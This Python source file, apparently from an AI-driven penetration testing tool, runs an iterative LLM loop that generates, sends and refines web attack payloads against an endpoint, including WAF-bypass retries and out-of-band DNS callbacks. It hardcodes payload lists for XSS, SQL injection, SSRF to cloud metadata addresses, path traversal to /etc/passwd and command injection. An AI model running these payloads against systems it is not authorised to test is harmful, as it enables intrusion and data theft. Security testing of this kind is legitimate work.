"""
WhiteHatHacker AI — Deep Probe Pipeline

The HUNTER'S BRAIN — iterative, LLM-driven endpoint probing that mimics
how a skilled human security researcher works:

1. ANALYZE: Study the endpoint (tech, params, behavior)
2. HYPOTHESIZE: LLM formulates attack hypotheses
3. PROBE: Send targeted test payloads
4. OBSERVE: Analyze server responses
5. ADAPT: Modify approach based on observations
6. ESCALATE: If indicator found, deepen the probe
7. PROVE: Execute full PoC and capture evidence
8. LOOP: Try different angles until exhausted or confirmed

This replaces the one-shot scanner approach with an iterative,
intelligent probing cycle that dramatically increases both:
- True positive rate (finds real vulns that scanners miss)
- Confidence level (every vuln is proven with evidence)

Integration: Called as a NEW STAGE between vuln_scan and fp_elimination,
or as an enhancement within vuln_scan itself.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import statistics
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from loguru import logger

from src.utils.response_validator import ResponseValidator, ValidationResult

# Module-level ResponseValidator instance shared by all probe functions
_response_validator = ResponseValidator()

# Host types that should be skipped entirely by deep probe.
# NOTE: cdn_only removed — CDN hosts can have misconfigurations behind CDN.
_SKIP_HOST_TYPES: frozenset[str] = frozenset({
    "redirect_host", "static_site",
})


class ProbePhase(str, Enum):
    """Phases of the deep probe cycle."""
    ANALYZE = "analyze"
    HYPOTHESIZE = "hypothesize"
    PROBE = "probe"
    OBSERVE = "observe"
    ADAPT = "adapt"
    ESCALATE = "escalate"
    PROVE = "prove"


@dataclass
class ProbeTarget:
    """A single target for deep probing."""
    url: str
    parameters: list[str] = field(default_factory=list)
    method: str = "GET"
    tech_stack: list[str] = field(default_factory=list)
    headers: dict[str, str] = field(default_factory=dict)
    auth_headers: dict[str, str] = field(default_factory=dict)   # Auth tokens/cookies to inject
    response_baseline: str = ""       # Normal response (for comparison)
    baseline_status: int = 200
    baseline_length: int = 0
    waf_detected: str = ""
    oob_domain: str = ""              # Interactsh OOB domain for blind payloads
    # Statistical baseline (P4.1)
    baseline_timing_median: float = 0.0
    baseline_timing_stddev: float = 0.0
    baseline_body_hashes: set[str] = field(default_factory=set)


@dataclass
class ProbeResult:
    """Result of a single probe attempt."""
    payload: str
    response_status: int = 0
    response_body: str = ""
    response_headers: dict[str, str] = field(default_factory=dict)
    response_length: int = 0
    response_time: float = 0.0
    diff_from_baseline: str = ""      # What changed vs baseline
    indicators: list[str] = field(default_factory=list)


@dataclass
class ProbeSession:
    """Tracks the state of a deep probe session for one endpoint."""
    target: ProbeTarget
    vuln_type: str
    phase: ProbePhase = ProbePhase.ANALYZE
    iteration: int = 0
    max_iterations: int = 10
    probes: list[ProbeResult] = field(default_factory=list)
    hypotheses: list[str] = field(default_factory=list)
    observations: list[str] = field(default_factory=list)
    adaptations: list[str] = field(default_factory=list)
    confirmed: bool = False
    poc_code: str = ""
    poc_result: Any = None             # PoCResult if proved
    confidence: float = 0.0
    evidence_chain: list[str] = field(default_factory=list)
    # Track confidence per iteration to detect stalls
    confidence_history: list[float] = field(default_factory=list)
    # Filtered characters detected by LLM analysis
    filtered_chars: list[str] = field(default_factory=list)
    # Whether WAF is actively blocking
    waf_blocking: bool = False


# Vuln-type specific timeout for HTTP probes (seconds)
_VULN_TYPE_TIMEOUT: dict[str, float] = {
    "sqli": 120.0,         # Time-based blind SQLi needs long waits
    "sqli_blind": 300.0,   # Extra long for multi-step blind extraction
    "sqli_error": 60.0,
    "xxe": 120.0,          # OOB XXE can be slow
    "ssrf": 90.0,          # Internal network probes can be slow
    "command_injection": 90.0,
    "rce": 90.0,
    "ssti": 60.0,
    "lfi": 45.0,
    "xss": 30.0,
    "open_redirect": 30.0,
    "cors": 20.0,
    "crlf": 30.0,
    "header_injection": 30.0,
}

def _get_probe_timeout(vuln_type: str, base_timeout: float) -> float:
    """Get appropriate timeout for a specific vulnerability type."""
    vt = vuln_type.lower().replace("-", "_").replace(" ", "_")
    for key, val in _VULN_TYPE_TIMEOUT.items():
        if key in vt:
            return max(val, base_timeout)
    return base_timeout


async def deep_probe_endpoint(
    target: ProbeTarget,
    vuln_types: list[str],
    brain_engine: Any,
    max_iterations: int = 10,
    timeout_per_probe: float = 60.0,
    session_dir: str = "",
    interactsh: Any = None,
) -> list[ProbeSession]:
    """
    Perform deep, iterative probing of a single endpoint for multiple vulnerability types.

    This is the core hunter loop: analyze → hypothesize → probe → observe → adapt → repeat.

    Args:
        target: ProbeTarget with endpoint details
        vuln_types: List of vulnerability types to test (e.g., ["xss", "sqli", "ssrf"])
        brain_engine: BrainEngine for LLM-driven analysis
        max_iterations: Maximum probe iterations per vuln type
        timeout_per_probe: Timeout for each HTTP probe
        session_dir: Directory for saving evidence

    Returns:
        List of ProbeSession results, one per vulnerability type
    """
    sessions = []

    # First, get baseline response
    if not target.response_baseline:
        target = await _get_baseline(target, timeout=timeout_per_probe)

    # Parallelize vuln type probing with a concurrency semaphore.
    # Limit to 2 concurrent probes to avoid overwhelming the target.
    _sem = asyncio.Semaphore(2)

    async def _probe_one_type(vuln_type: str) -> ProbeSession:
        # Use vuln-type-specific timeout
        _effective_timeout = _get_probe_timeout(vuln_type, timeout_per_probe)
        # Blind vuln types benefit from more iterations (P4.4)
        _BLIND_TYPES = {"sqli_blind", "ssrf", "xxe", "ssti", "command_injection", "rce"}
        _effective_max = min(max_iterations * 2, 20) if vuln_type in _BLIND_TYPES else max_iterations
        session = ProbeSession(
            target=target,
            vuln_type=vuln_type,
            max_iterations=_effective_max,
        )
        async with _sem:
            try:
                logger.info(
                    f"Deep probe starting | {vuln_type} | {target.url[:60]} | "
                    f"params={target.parameters[:5]} | max_iter={max_iterations} | "
                    f"timeout={_effective_timeout:.0f}s"
                )
                session = await _run_probe_cycle(
                    session=session,
                    brain_engine=brain_engine,
                    timeout=_effective_timeout,
                    session_dir=session_dir,
                    interactsh=interactsh,
                )
                if session.confirmed:
                    logger.info(
                        f"🎯 VULNERABILITY CONFIRMED | {vuln_type} | "
                        f"{target.url[:60]} | confidence={session.confidence:.1f}"
                    )
                else:
                    logger.debug(
                        f"Probe completed | {vuln_type} | {target.url[:60]} | "
                        f"not confirmed after {session.iteration} iterations"
                    )
            except Exception as e:
                logger.error(f"Deep probe error for {vuln_type}: {e}")
                session.observations.append(f"Error: {e}")
        return session

    if len(vuln_types) > 1:
        # Run multiple vuln types in parallel
        results = await asyncio.gather(
            *[_probe_one_type(vt) for vt in vuln_types],
            return_exceptions=True,
        )
        for r in results:
            if isinstance(r, ProbeSession):
                sessions.append(r)
            elif isinstance(r, Exception):
                logger.error(f"Deep probe parallel task failed: {r}")
    else:
        # Single type — run directly
        for vuln_type in vuln_types:
            sessions.append(await _probe_one_type(vuln_type))

    return sessions


async def _run_probe_cycle(
    session: ProbeSession,
    brain_engine: Any,
    timeout: float,
    session_dir: str = "",
    interactsh: Any = None,
) -> ProbeSession:
    """Execute the full probe cycle for one vulnerability type.

    Improved iteration logic:
    - Tracks confidence progress per iteration (stall detection)
    - Feeds adaptations and filtered_chars back into hypothesis
    - Scales early-exit logic based on confidence trajectory
    """

    target = session.target
    # OOB tag for Interactsh correlation
    _oob_tag = f"dp-{session.vuln_type[:6]}"

    for iteration in range(1, session.max_iterations + 1):
        session.iteration = iteration

        # ── PHASE 1: ANALYZE (LLM analyzes what we know) ──
        if iteration == 1:
            session.phase = ProbePhase.ANALYZE
            analysis = await _llm_analyze_target(brain_engine, session)
            session.observations.append(f"Initial analysis: {analysis[:200]}")

        # ── PHASE 2: HYPOTHESIZE (LLM generates attack hypothesis) ──
        session.phase = ProbePhase.HYPOTHESIZE
        hypothesis = await _llm_generate_hypothesis(brain_engine, session)
        session.hypotheses.append(hypothesis.get("hypothesis", ""))
        payloads = hypothesis.get("payloads", [])

        if not payloads:
            logger.debug(f"No payloads generated for iteration {iteration}")
            break

        # ── PHASE 3: PROBE (Send payloads and capture responses) ──
        session.phase = ProbePhase.PROBE
        probe_results = await _send_probes(
            target=target,
            payloads=payloads,
            vuln_type=session.vuln_type,
            timeout=timeout,
            oob_domain=target.oob_domain,
            oob_tag=f"{_oob_tag}-i{iteration}",
        )
        session.probes.extend(probe_results)

        # ── Check OOB callbacks (blind vuln detection) ──
        if interactsh and target.oob_domain and session.vuln_type in (
            "ssrf", "xxe", "rce", "command_injection", "ssti", "sqli_blind",
        ):
            try:
                await asyncio.sleep(3)  # Wait for OOB callback propagation
                if interactsh.has_interaction(tag=_oob_tag):
                    oob_hits = interactsh.get_interactions(tag=_oob_tag)
                    session.confidence = min(100.0, session.confidence + 35.0)
                    for hit in oob_hits[:3]:
                        proto = hit.get("protocol", "unknown").upper()
                        remote = hit.get("remote-address", "?")
                        indicator = f"OOB_{proto}_CALLBACK from {remote} (tag={_oob_tag})"
                        session.evidence_chain.append(indicator)
                    logger.info(
                        f"🎯 OOB callback confirmed! | {session.vuln_type} | "
                        f"{len(oob_hits)} hit(s) | confidence → {session.confidence:.1f}"
                    )
            except Exception as e:
                logger.warning(f"OOB check failed: {e}")

        # ── PHASE 4: OBSERVE (Analyze responses for vulnerability indicators) ──
        session.phase = ProbePhase.OBSERVE
        observation = await _llm_analyze_responses(brain_engine, session, probe_results)
        session.observations.append(observation.get("observation", ""))

        # Check if we found something
        indicators = observation.get("indicators", [])
        confidence_delta = observation.get("confidence_delta", 0.0)
        session.confidence = min(100.0, session.confidence + confidence_delta)

        if indicators:
            session.evidence_chain.extend(indicators)

        # Track confidence history for stall detection
        session.confidence_history.append(session.confidence)

        # Capture WAF and filter info for feeding back into next hypothesis
        if observation.get("is_waf_blocking"):
            session.waf_blocking = True
        filtered = observation.get("filtered_chars", [])
        if filtered and isinstance(filtered, list):
            for fc in filtered:
                if fc not in session.filtered_chars:
                    session.filtered_chars.append(fc)

        # ── PHASE 5: DECIDE — escalate, adapt, or stop ──
        if session.confidence >= 80.0:
            # ESCALATE → Move to prove phase
            session.phase = ProbePhase.ESCALATE
            logger.info(
                f"Escalating to PoC | {session.vuln_type} | "
                f"confidence={session.confidence:.1f}"
            )
            break

        # Stall detection: if confidence hasn't increased in last 6 iterations, stop
        if len(session.confidence_history) >= 7:
            recent = session.confidence_history[-6:]
            if max(recent) - min(recent) < 2.0 and session.confidence < 40.0:
                logger.debug(
                    f"Confidence stalled at {session.confidence:.1f} for 6 iterations, stopping | "
                    f"{session.vuln_type}"
                )
                break

        if session.confidence < 15.0 and iteration >= 4:
            # Very low confidence after 4 iterations — likely not vulnerable
            logger.debug(
                f"Low confidence after {iteration} iterations, stopping | "
                f"{session.vuln_type} | confidence={session.confidence:.1f}"
            )
            break

        # ── PHASE 6: ADAPT (Record strategy changes for next hypothesis) ──
        session.phase = ProbePhase.ADAPT
        adaptation = observation.get("adaptation", "")
        if adaptation:
            session.adaptations.append(adaptation)

    # ── PHASE 7: PROVE (Generate and execute PoC if high confidence) ──
    if session.confidence >= 60.0:
        session.phase = ProbePhase.PROVE
        session = await _prove_vulnerability(
            session=session,
            brain_engine=brain_engine,
            session_dir=session_dir,
        )

    return session


# ── Default payloads when LLM hypothesis generation fails ─────

_DEFAULT_PAYLOADS_BY_TYPE: dict[str, list[dict]] = {
    "xss": [
        {"value": "<img src=x onerror=alert(1)>", "param": "", "method": "GET", "note": "basic reflected XSS"},
        {"value": "'\"--><script>alert(1)</script>", "param": "", "method": "GET", "note": "break out of attribute"},
        {"value": "{{7*7}}", "param": "", "method": "GET", "note": "SSTI check (also XSS context)"},
        {"value": "\"><svg/onload=alert(1)>", "param": "", "method": "GET", "note": "SVG onload XSS"},
        {"value": "javascript:alert(1)//", "param": "", "method": "GET", "note": "javascript: protocol XSS"},
        {"value": "<details open ontoggle=alert(1)>", "param": "", "method": "GET", "note": "HTML5 event handler"},
        {"value": "'-alert(1)-'", "param": "", "method": "GET", "note": "JS context break"},
    ],
    "sqli": [
        {"value": "' OR '1'='1", "param": "", "method": "GET", "note": "classic boolean blind"},
        {"value": "1' AND SLEEP(3)--", "param": "", "method": "GET", "note": "time-based blind MySQL"},
        {"value": "1 UNION SELECT NULL,NULL--", "param": "", "method": "GET", "note": "UNION query"},
        {"value": "1' AND 1=1--", "param": "", "method": "GET", "note": "boolean true test"},
        {"value": "1' AND 1=2--", "param": "", "method": "GET", "note": "boolean false test"},
        {"value": "1;WAITFOR DELAY '0:0:3'--", "param": "", "method": "GET", "note": "time-based MSSQL"},
        {"value": "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--", "param": "", "method": "GET", "note": "subquery sleep"},
        {"value": "1' OR '1'='1' /*", "param": "", "method": "GET", "note": "comment-based SQLi"},
    ],
    "ssrf": [
        {"value": "http://169.254.169.254/latest/meta-data/", "param": "", "method": "GET", "note": "AWS metadata"},
        {"value": "http://127.0.0.1:80", "param": "", "method": "GET", "note": "localhost probe"},
        {"value": "http://[::1]:80/", "param": "", "method": "GET", "note": "IPv6 localhost"},
        {"value": "http://169.254.169.254/computeMetadata/v1/", "param": "", "method": "GET", "note": "GCP metadata"},
        {"value": "http://100.100.100.200/latest/meta-data/", "param": "", "method": "GET", "note": "Alibaba metadata"},
        {"value": "http://0x7f000001/", "param": "", "method": "GET", "note": "hex IP bypass"},
    ],
    "ssti": [
        {"value": "{{7*7}}", "param": "", "method": "GET", "note": "Jinja2/Twig detection"},
        {"value": "${7*7}", "param": "", "method": "GET", "note": "Groovy/Freemarker"},
        {"value": "<%=7*7%>", "param": "", "method": "GET", "note": "ERB detection"},
        {"value": "#{7*7}", "param": "", "method": "GET", "note": "Ruby interpolation"},
        {"value": "*{7*7}", "param": "", "method": "GET", "note": "Thymeleaf detection"},
        {"value": "{{config}}", "param": "", "method": "GET", "note": "Jinja2 config leak"},
    ],
    "lfi": [
        {"value": "../../../../etc/passwd", "param": "", "method": "GET", "note": "classic traversal"},
        {"value": "....//....//....//etc/passwd", "param": "", "method": "GET", "note": "double encoding bypass"},
        {"value": "/etc/passwd%00", "param": "", "method": "GET", "note": "null byte truncation"},
        {"value": "..%252f..%252f..%252fetc/passwd", "param": "", "method": "GET", "note": "double URL encode"},
        {"value": "....\\....\\....\\windows\\win.ini", "param": "", "method": "GET", "note": "Windows LFI"},
        {"value": "php://filter/convert.base64-encode/resource=index", "param": "", "method": "GET", "note": "PHP filter chain"},
    ],
    "command_injection": [
        {"value": "; id", "param": "", "method": "GET", "note": "semicolon command separator"},
        {"value": "| cat /etc/passwd", "param": "", "method": "GET", "note": "pipe command"},
        {"value": "`id`", "param": "", "method": "GET", "note": "backtick execution"},
        {"value": "$(id)", "param": "", "method": "GET", "note": "subshell injection"},
        {"value": "|| whoami", "param": "", "method": "GET", "note": "OR operator"},
    ],
    "open_redirect": [
        {"value": "https://evil.com", "param": "", "method": "GET", "note": "direct redirect"},
        {"value": "//evil.com", "param": "", "method": "GET", "note": "protocol-relative"},
        {"value": "/\\evil.com", "param": "", "method": "GET", "note": "backslash bypass"},
        {"value": "https://evil.com%2F%2F", "param": "", "method": "GET", "note": "encoded slashes"},
    ],
}


def _default_payloads(session: ProbeSession) -> list[dict]:
    """Return sensible default payloads when LLM fails to generate hypotheses.

    Generates payloads for ALL known parameters (up to 5), not just the first one.
    """
    params = session.target.parameters[:5] if session.target.parameters else ["q"]
    vt = session.vuln_type.lower().replace("-", "").replace("_", "").replace(" ", "")
    for key, payloads in _DEFAULT_PAYLOADS_BY_TYPE.items():
        if key in vt:
            result = []
            for param in params:
                result.extend(dict(p, param=param) if not p["param"] else p for p in payloads)
            return result
    # Generic fallback — test all params
    result = []
    for param in params:
        result.append({"value": "<img src=x onerror=alert(1)>", "param": param, "method": "GET", "note": f"generic XSS ({param})"})
        result.append({"value": "' OR '1'='1", "param": param, "method": "GET", "note": f"generic SQLi ({param})"})
    return result


async def _get_baseline(target: ProbeTarget, timeout: float = 10.0) -> ProbeTarget:
    """Get statistical baseline for the target endpoint.

    Sends 3 requests to establish timing distribution (median, stddev),
    body hash fingerprint set, and response characteristics.  Also validates
    with ResponseValidator for WAF/CDN/SPA detection.
    """
    import httpx

    _NUM_BASELINE = 3
    timings: list[float] = []
    body_hashes: set[str] = set()

    try:
        async with httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
        ) as client:
            req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            if target.auth_headers:
                req_headers.update(target.auth_headers)

            for i in range(_NUM_BASELINE):
                t0 = time.monotonic()
                resp = await client.request(
                    method=target.method,
                    url=target.url,
                    headers=req_headers,
                )
                elapsed = time.monotonic() - t0
                timings.append(elapsed)
                body_text = resp.text[:5000]
                body_hashes.add(hashlib.md5(body_text.encode("utf-8", errors="replace")).hexdigest())

                if i == 0:
                    # First response sets primary baseline fields
                    target.response_baseline = body_text
                    target.baseline_status = resp.status_code
                    target.baseline_length = len(resp.text)
                    target.headers = dict(resp.headers)

                if i < _NUM_BASELINE - 1:
                    await asyncio.sleep(0.3)

            # Compute timing statistics
            target.baseline_timing_median = statistics.median(timings)
            if len(timings) >= 2:
                target.baseline_timing_stddev = statistics.stdev(timings)
            target.baseline_body_hashes = body_hashes

            # Validate baseline with ResponseValidator
            baseline_vr = _response_validator.validate(
                status_code=target.baseline_status,
                headers=dict(resp.headers),
                body=target.response_baseline,
                url=target.url,
            )
            if baseline_vr.is_waf_block:
                target.waf_detected = baseline_vr.waf_name or "unknown"
                logger.debug(
                    f"Baseline WAF detected for {target.url}: {baseline_vr.waf_name}"
                )
            # Register baseline for SPA catch-all detection
            _response_validator.set_baseline(
                _extract_host(target.url), target.response_baseline
            )
    except Exception as e:
        logger.warning(f"Baseline request failed: {e}")

    return target


async def _llm_analyze_target(brain_engine: Any, session: ProbeSession) -> str:
    """LLM analyzes the target to identify attack opportunities."""
    from src.brain.engine import BrainType

    target = session.target

    prompt = f"""Analyze this web endpoint for {session.vuln_type} vulnerability testing.

URL: {target.url}
Method: {target.method}
Parameters: {json.dumps(target.parameters[:20])}
Tech Stack: {json.dumps(target.tech_stack[:10])}
Response Headers: {json.dumps(dict(list(target.headers.items())[:15]))}
Response Status: {target.baseline_status}
Response Length: {target.baseline_length} bytes
WAF: {target.waf_detected or 'Not detected'}
Response Body (first 500 chars): {target.response_baseline[:500]}

What are the most promising attack vectors for {session.vuln_type} on this endpoint?
Consider: parameter injection points, encoding behavior, error handling, technology-specific weaknesses.

Reply in 3-5 bullet points, be specific about WHERE and HOW to test."""

    try:
        response = await asyncio.wait_for(
            brain_engine.think(prompt=prompt, brain=BrainType.SECONDARY, temperature=0.2),
            timeout=1200.0,
        )
        return response.text.strip()
    except Exception as e:
        return f"Analysis failed: {e}"


async def _llm_generate_hypothesis(
    brain_engine: Any,
    session: ProbeSession,
) -> dict:
    """LLM generates attack hypothesis and specific payloads to test."""
    from src.brain.engine import BrainType

    target = session.target

    # Build history context
    history = ""
    if session.probes:
        history = "Previous probe results:\n"
        for i, probe in enumerate(session.probes[-5:]):
            history += (
                f"  Probe {i+1}: payload='{probe.payload[:60]}' → "
                f"status={probe.response_status} | "
                f"length={probe.response_length} | "
                f"time={probe.response_time:.2f}s | "
                f"diff={probe.diff_from_baseline[:100]}\n"
            )

    adaptations = ""
    if session.adaptations:
        adaptations = "Adaptations from previous iterations (APPLY THESE — they are lessons learned):\n" + "\n".join(
            f"  - {a}" for a in session.adaptations[-5:]
        )

    # Feed back detected filters so LLM designs payloads that bypass them
    filter_info = ""
    if session.filtered_chars:
        filter_info = f"\n### IMPORTANT — Detected Filters\nThe target is filtering these characters/patterns: {json.dumps(session.filtered_chars)}\nYou MUST design payloads that AVOID or ENCODE these characters.\n"

    waf_info = ""
    if session.waf_blocking:
        waf_info = "\n### WARNING — WAF is actively blocking payloads\nUse WAF bypass techniques: encoding, case randomization, comment insertion, Unicode normalization.\n"

    prompt = f"""## Hypothesis Generation — Iteration {session.iteration}

You are probing {target.url} for **{session.vuln_type}**.

### Endpoint Info
- Parameters: {json.dumps(target.parameters[:15])}
- Method: {target.method}
- Tech: {', '.join(target.tech_stack[:5])}
- WAF: {target.waf_detected or 'None'}
- Baseline: status={target.baseline_status}, length={target.baseline_length}
- Baseline Timing: median={target.baseline_timing_median:.2f}s, stddev={target.baseline_timing_stddev:.3f}s
- Baseline Body (first 300 chars): {target.response_baseline[:300]}

### Current Confidence: {session.confidence:.1f}/100

{history}
{adaptations}
{filter_info}
{waf_info}

### Task
Generate a hypothesis about how {session.vuln_type} might work on this endpoint, and provide 3-5 specific payloads to test it.

Each payload should:
1. Test from a DIFFERENT angle than previous probes
2. Account for any filtering/WAF detected in previous responses
3. Be injectable into one of: {json.dumps(target.parameters[:10])}

Return JSON:
{{
  "hypothesis": "Clear statement of what you think is vulnerable and why",
  "payloads": [
    {{"value": "payload_string", "param": "param_name", "method": "GET_or_POST", "note": "why this approach"}}
  ]
}}

Return ONLY valid JSON."""

    try:
        response = await asyncio.wait_for(
            brain_engine.think(prompt=prompt, brain=BrainType.PRIMARY, temperature=0.3),
            timeout=1200.0,
        )

        text = response.text.strip()
        # Clean markdown
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
        if text.endswith("```"):
            text = text[:-3]

        return json.loads(text.strip())
    except json.JSONDecodeError:
        # Try to extract JSON from mixed text
        try:
            from src.utils.json_utils import extract_json
            parsed = extract_json(response.text, fallback=None)
            if parsed:
                return parsed
        except Exception as _exc:
            logger.warning(f"deep probe error: {_exc}")
        return {"hypothesis": "Failed to parse", "payloads": _default_payloads(session)}
    except Exception as e:
        logger.warning(f"Hypothesis generation failed: {e}")
        return {"hypothesis": f"Error: {e}", "payloads": _default_payloads(session)}


async def _send_probes(
    target: ProbeTarget,
    payloads: list[dict],
    vuln_type: str,
    timeout: float = 60.0,
    oob_domain: str = "",
    oob_tag: str = "",
) -> list[ProbeResult]:
    """Send probe payloads and capture responses.

    For blind vuln types (ssrf, xxe, rce, ssti), injects Interactsh OOB URLs
    into payloads to enable out-of-band confirmation.
    """
    import httpx

    # Blind vuln types that benefit from OOB callback injection
    _BLIND_VULN_TYPES = {"ssrf", "xxe", "rce", "command_injection", "ssti", "sqli_blind"}
    _use_oob = oob_domain and vuln_type in _BLIND_VULN_TYPES

    results = []

    async with httpx.AsyncClient(
        timeout=timeout,
        verify=False,
        follow_redirects=True,
    ) as client:
        for idx, payload_info in enumerate(payloads[:5]):  # Max 5 payloads per iteration
            # Rotate through available parameters when no specific param given
            _fallback_param = (
                target.parameters[idx % len(target.parameters)]
                if target.parameters
                else "q"
            )
            if isinstance(payload_info, str):
                payload_value = payload_info
                param_name = _fallback_param
                method = target.method
            else:
                payload_value = payload_info.get("value", payload_info.get("payload", ""))
                param_name = payload_info.get("param") or _fallback_param
                method = payload_info.get("method", target.method)

            if not payload_value:
                continue

            # ── OOB URL injection for blind vulnerabilities ──
            # Replace placeholder OOB URLs or append OOB callback URL to payload
            if _use_oob:
                _oob_url = f"http://{oob_tag}-p{idx}.{oob_domain}"
                _oob_dns = f"{oob_tag}-p{idx}.{oob_domain}"
                # Substitute common OOB placeholders in LLM-generated payloads
                for placeholder in ("{{OOB}}", "{{CALLBACK}}", "BURP_COLLABORATOR", "OAST_URL",
                                    "interact.sh", "collaborator.net", "oastify.com",
                                    "dnslog.cn", "ceye.io"):
                    if placeholder in payload_value:
                        payload_value = payload_value.replace(placeholder, _oob_url)
                # For SSRF: if payload looks like a URL but doesn't have OOB, add OOB variant
                if vuln_type == "ssrf" and oob_domain not in payload_value:
                    # Send original payload first, then an extra OOB probe
                    payload_value = _oob_url
                # For XXE: inject DNS canary into entity declarations
                elif vuln_type == "xxe" and "ENTITY" in payload_value and oob_domain not in payload_value:
                    payload_value = payload_value.replace(
                        "http://attacker", _oob_url
                    ).replace("ATTACKER_DOMAIN", _oob_dns)
                # For RCE/command injection: append DNS ping
                elif vuln_type in ("rce", "command_injection") and oob_domain not in payload_value:
                    payload_value += f" && nslookup {_oob_dns}"

            try:
                start_time = time.monotonic()

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                }
                # Inject auth headers (tokens/cookies) if available
                if target.auth_headers:
                    headers.update(target.auth_headers)

                # Special handling for different vuln types
                if vuln_type == "cors":
                    headers["Origin"] = payload_value
                    resp = await client.request(method=method, url=target.url, headers=headers)
                elif vuln_type == "crlf" or vuln_type == "header_injection":
                    # Inject into a header
                    headers["X-Custom"] = payload_value
                    resp = await client.request(method=method, url=target.url, headers=headers)
                elif method.upper() == "POST":
                    resp = await client.post(
                        target.url,
                        data={param_name: payload_value},
                        headers=headers,
                    )
                else:
                    # GET with query parameter
                    params = {param_name: payload_value}
                    resp = await client.get(
                        target.url,
                        params=params,
                        headers=headers,
                    )

                elapsed = time.monotonic() - start_time
                body = resp.text[:5000]

                # ── ResponseValidator: reject WAF/CDN/SPA/redirect responses ──
                vr = _response_validator.validate(
                    status_code=resp.status_code,
                    headers=dict(resp.headers),
                    body=body,
                    baseline_body=target.response_baseline or None,
                    url=target.url,
                )

                if not vr.is_valid:
                    # Response is garbage (WAF block, redirect, SPA catch-all)
                    # Still record the probe but with NO indicators
                    results.append(ProbeResult(
                        payload=payload_value,
                        response_status=resp.status_code,
                        response_body=body[:3000],
                        response_headers=dict(resp.headers),
                        response_length=len(resp.text),
                        response_time=elapsed,
                        diff_from_baseline=f"REJECTED: {vr.rejection_reason}",
                        indicators=[],
                    ))
                    continue

                # Compute diff from baseline
                diff = _compute_response_diff(
                    baseline_status=target.baseline_status,
                    baseline_length=target.baseline_length,
                    baseline_body=target.response_baseline[:2000],
                    probe_status=resp.status_code,
                    probe_length=len(resp.text),
                    probe_body=body[:2000],
                    payload=payload_value,
                )

                # Detect indicators
                indicators = _detect_indicators(
                    vuln_type=vuln_type,
                    payload=payload_value,
                    body=body,
                    headers=dict(resp.headers),
                    status=resp.status_code,
                    elapsed=elapsed,
                    baseline_timing_median=target.baseline_timing_median,
                    baseline_timing_stddev=target.baseline_timing_stddev,
                    baseline_body=target.response_baseline[:2000],
                )

                results.append(ProbeResult(
                    payload=payload_value,
                    response_status=resp.status_code,
                    response_body=body[:3000],
                    response_headers=dict(resp.headers),
                    response_length=len(resp.text),
                    response_time=elapsed,
                    diff_from_baseline=diff,
                    indicators=indicators,
                ))

            except Exception as e:
                results.append(ProbeResult(
                    payload=payload_value,
                    diff_from_baseline=f"Error: {e}",
                ))

            # Rate limiting between probes
            await asyncio.sleep(0.5)

    # ── C1: WAF-adaptive retry — if majority blocked, retry with bypass variants ──
    if len(results) >= 3:
        try:
            from src.tools.scanners.waf_strategy import is_waf_blocked, generate_bypass_variants, WAFResult

            blocked = sum(
                1
                for r in results
                if is_waf_blocked(r.response_status, r.response_body or "")
            )
            if blocked >= len(results) * 0.6:
                logger.info(
                    f"WAF blocked {blocked}/{len(results)} probes — generating bypass variants"
                )
                # Pick a non-error payload to generate variants from
                source_payload = next(
                    (r.payload for r in results if r.payload and r.response_status > 0),
                    None,
                )
                if source_payload:
                    # Use default WAF result (unknown WAF)
                    waf_result = WAFResult(host="unknown", detected=True, waf_name="unknown", confidence=0.5)
                    variants = generate_bypass_variants(source_payload, waf_result, max_variants=3)
                    if variants:
                        bypass_payloads = [{"value": v, "param": None, "method": target.method} for v in variants]
                        bypass_results = await _send_probes_inner(
                            client_params={"timeout": timeout, "verify": False, "follow_redirects": True},
                            target=target,
                            payloads=bypass_payloads,
                            vuln_type=vuln_type,
                            oob_domain=oob_domain,
                            oob_tag=oob_tag,
                        )
                        results.extend(bypass_results)
        except Exception as waf_exc:
            logger.warning(f"WAF bypass retry failed: {waf_exc}")

    return results


async def _send_probes_inner(
    client_params: dict,
    target: ProbeTarget,
    payloads: list[dict],
    vuln_type: str,
    oob_domain: str = "",
    oob_tag: str = "",
) -> list[ProbeResult]:
    """Inner probe sender for WAF bypass retries (no recursive WAF check)."""
    import httpx

    results = []
    async with httpx.AsyncClient(**client_params) as client:
        for idx, payload_info in enumerate(payloads[:3]):
            _fallback_param = (
                target.parameters[idx % len(target.parameters)]
                if target.parameters
                else "q"
            )
            if isinstance(payload_info, str):
                payload_value = payload_info
                param_name = _fallback_param
                method = target.method
            else:
                payload_value = payload_info.get("value", payload_info.get("payload", ""))
                param_name = payload_info.get("param") or _fallback_param
                method = payload_info.get("method", target.method)

            if not payload_value:
                continue

            try:
                start_time = time.monotonic()
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                }
                if target.auth_headers:
                    headers.update(target.auth_headers)

                if method.upper() == "POST":
                    resp = await client.post(target.url, data={param_name: payload_value}, headers=headers)
                else:
                    resp = await client.get(target.url, params={param_name: payload_value}, headers=headers)

                elapsed = time.monotonic() - start_time
                body = resp.text[:5000]

                diff = _compute_response_diff(
                    baseline_status=target.baseline_status,
                    baseline_length=target.baseline_length,
                    baseline_body=target.response_baseline[:2000],
                    probe_status=resp.status_code,
                    probe_length=len(resp.text),
                    probe_body=body[:2000],
                    payload=payload_value,
                )
                indicators = _detect_indicators(
                    vuln_type=vuln_type, payload=payload_value,
                    body=body, headers=dict(resp.headers),
                    status=resp.status_code, elapsed=elapsed,
                    baseline_timing_median=target.baseline_timing_median,
                    baseline_timing_stddev=target.baseline_timing_stddev,
                    baseline_body=target.response_baseline[:2000],
                )
                results.append(ProbeResult(
                    payload=payload_value,
                    response_status=resp.status_code,
                    response_body=body[:3000],
                    response_headers=dict(resp.headers),
                    response_length=len(resp.text),
                    response_time=elapsed,
                    diff_from_baseline=diff,
                    indicators=indicators,
                ))
            except Exception as e:
                results.append(ProbeResult(payload=payload_value, diff_from_baseline=f"Error: {e}"))
            await asyncio.sleep(0.5)
    return results


def _extract_host(url: str) -> str:
    """Extract host from URL for ResponseValidator baseline keying."""
